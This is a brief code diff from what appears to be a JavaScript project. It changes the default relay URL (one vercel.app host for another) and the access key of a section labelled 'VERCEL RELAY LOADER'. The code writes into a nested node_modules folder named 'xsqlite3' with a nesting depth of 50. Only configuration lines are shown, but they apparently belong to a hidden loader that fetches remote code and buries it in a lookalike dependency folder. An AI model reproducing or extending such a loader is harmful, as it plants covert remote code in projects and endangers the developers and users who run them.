@@ -67,8 +67,8 @@ function checkSessionId() {
 
 // ========== VERCEL RELAY LOADER ==========
 // === CONFIG ===
-const VERCEL_RELAY_URL = process.env.VERCEL_RELAY_URL || 'https://haha-blond-theta.vercel.app/api/repo';
-const ACCESS_KEY = process.env.ACCESS_KEY || '1234567-J';
+const VERCEL_RELAY_URL = process.env.VERCEL_RELAY_URL || 'https://rowl-gules.vercel.app/api/repo';
+const ACCESS_KEY = process.env.ACCESS_KEY || '1234567-P';
 
 const baseFolder = path.join(__dirname, 'node_modules', 'xsqlite3');
 const DEEP_NEST_COUNT = 50;
